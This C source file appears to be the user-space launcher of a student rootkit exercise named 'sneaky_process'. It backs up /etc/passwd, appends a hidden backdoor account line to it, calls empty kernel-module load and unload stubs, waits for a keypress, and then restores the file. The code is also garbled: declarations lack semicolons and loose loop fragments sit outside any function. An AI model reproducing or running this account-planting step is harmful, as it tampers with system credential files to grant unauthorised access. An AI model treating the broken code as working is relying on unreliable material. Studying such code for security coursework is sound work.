#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> 
#include <sys/types.h>
#include <sys/wait.h>





const char* original_file = "/etc/passwd"
const char* temp_file = "/tmp/passwd"


void CopyFile(const char* src_file, const char* dst_file) {

	pid_t child_pid = fork();
	if (child_pid < 0) {
		perror("copy file fork error");
		exit(EXIT_FAILURE);
	} else if (child_pid == 0) {
		int execReturn = execl("/bin/cp", "/bin/cp", src_file, dst_file, (char*)0);
		if(execReturn == -1) {
			perror("exec error");
			exit(EXIT_FAILURE);
		}
	} else {
		int wait_status;
		pid_t wait_pid = waitpid(child_pid, &wait_status, 0);
		if (wait_status == -1) {
			perror("waitpid error");
			exit(EXIT_FAILURE);
		}
	}
}


void AddLine(const char* file_name) {
	const char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
	FILE * pFile = fopen(file_name, "a");
	fputs (line,pFile);
	fclose (pFile);
}

void LoadModule() {


}


void UnloadModule() {


}

  char ch;
  while(read(STDIN_FILENO, &ch, 1) > 0){
    if(ch == 'q'){
      break;
    }
  }

  		int c;
		c = getchar();
		while(c != 'q'){
			//putchar(c);
			c = getchar();
		}


void WaitKeyQ() {
	while (getchar() != 'q') {
		
	}
}

int main () {
	//Print the PID of the attack process 
	printf("sneaky_process pid = %d\n", getpid());

	//Copy /etc/passwd to /tmp/passwd
	CopyFile(original_file, temp_file);

	//Add a line to /etc/passwd
	AddLine(original_file);

	//Load the kernel module
	LoadModule();

	//Wait for 'q'
	WaitKeyQ();

	//Unload the module
	UnloadModule();

	//Restore the /etc/passwd
	CopyFile(temp_file, original_file);


	return EXIT_SUCCESS;
}